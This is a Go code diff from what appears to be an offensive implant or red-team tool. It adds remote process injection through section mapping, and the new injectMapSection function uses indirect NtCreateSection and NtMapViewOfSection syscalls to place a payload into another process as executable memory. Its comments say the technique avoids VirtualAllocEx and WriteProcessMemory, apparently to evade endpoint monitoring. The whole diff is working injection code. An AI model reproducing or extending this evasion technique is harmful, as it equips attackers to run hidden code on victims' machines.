@@ -14,8 +14,13 @@ import (
 	"golang.org/x/sys/windows"
 )
 
+
+const (
+	SECTION_ALL_ACCESS = 0xF001F
+	SEC_COMMIT         = 0x08000000
+)
 var (
-	procReadProcessMemoryHelper = kernel32.NewProc("ReadProcessMemory")
+	procReadProcessMemoryHelper = windows.NewLazySystemDLL("kernel32.dll").NewProc("ReadProcessMemory")
 )
 
 // injectOpenProcess opens a process handle, using indirect syscalls when available.
@@ -50,14 +55,14 @@ func injectAllocMemory(hProcess uintptr, size int, protect uint32) (uintptr, err
 		var addr uintptr
 		regionSize := uintptr(size)
 		status := IndirectNtAllocateVirtualMemory(hProcess, &addr, &regionSize,
-			MEM_COMMIT|MEM_RESERVE, protect)
+			windows.MEM_COMMIT|windows.MEM_RESERVE, protect)
 		if status != 0 {
 			return 0, fmt.Errorf("memory allocation failed: NTSTATUS 0x%X", status)
 		}
 		return addr, nil
 	}
 	addr, _, err := procVirtualAllocEx.Call(hProcess, 0, uintptr(size),
-		uintptr(MEM_COMMIT|MEM_RESERVE), uintptr(protect))
+		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(protect))
 	if addr == 0 {
 		return 0, fmt.Errorf("memory allocation failed: %v", err)
 	}
@@ -157,7 +162,14 @@ func injectProtectMemory(hProcess, addr uintptr, size int, protect uint32) (uint
 // writes data, and changes protection to the final value (typically RX).
 // This enforces the W^X pattern automatically.
 func injectAllocWriteProtect(hProcess uintptr, data []byte, finalProtect uint32) (uintptr, error) {
-	addr, err := injectAllocMemory(hProcess, len(data), PAGE_READWRITE)
+	if IndirectSyscallsAvailable() {
+		addr, err := injectMapSection(hProcess, data, finalProtect)
+		if err == nil {
+			return addr, nil
+		}
+		// Fallback if section mapping fails
+	}
+	addr, err := injectAllocMemory(hProcess, len(data), windows.PAGE_READWRITE)
 	if err != nil {
 		return 0, err
 	}
@@ -170,4 +182,48 @@ func injectAllocWriteProtect(hProcess uintptr, data []byte, finalProtect uint32)
 		return 0, err
 	}
 	return addr, nil
+}
+
+// injectMapSection maps a section into a remote process for execution, avoiding VirtualAllocEx and WriteProcessMemory.
+func injectMapSection(hProcess uintptr, data []byte, finalProtect uint32) (uintptr, error) {
+	if !IndirectSyscallsAvailable() {
+		return 0, fmt.Errorf("indirect syscalls required for section mapping")
+	}
+
+	// 1. Create a section locally
+	var hSection uintptr
+	maxSize := int64(len(data))
+	status := IndirectNtCreateSection(&hSection, SECTION_ALL_ACCESS, &maxSize, windows.PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0)
+	if status != 0 {
+		return 0, fmt.Errorf("NtCreateSection failed: NTSTATUS 0x%X", status)
+	}
+	defer IndirectNtClose(hSection)
+
+	// 2. Map view into local process as RW
+	var localBaseAddress uintptr
+	var localViewSize uintptr = 0 // map entire section
+
+	// Get pseudo handle for current process (-1)
+	currentProcess := ^uintptr(0)
+
+	status = IndirectNtMapViewOfSection(hSection, currentProcess, &localBaseAddress, &localViewSize, windows.PAGE_READWRITE)
+	if status != 0 {
+		return 0, fmt.Errorf("local NtMapViewOfSection failed: NTSTATUS 0x%X", status)
+	}
+	defer IndirectNtUnmapViewOfSection(currentProcess, localBaseAddress)
+
+	// 3. Copy data to local mapped view
+	localSlice := unsafe.Slice((*byte)(unsafe.Pointer(localBaseAddress)), len(data))
+	copy(localSlice, data)
+
+	// 4. Map view into remote process with desired protection (e.g., RX)
+	var remoteBaseAddress uintptr
+	var remoteViewSize uintptr = 0 // map entire section
+
+	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBaseAddress, &remoteViewSize, finalProtect)
+	if status != 0 {
+		return 0, fmt.Errorf("remote NtMapViewOfSection failed: NTSTATUS 0x%X", status)
+	}
+
+	return remoteBaseAddress, nil
 }
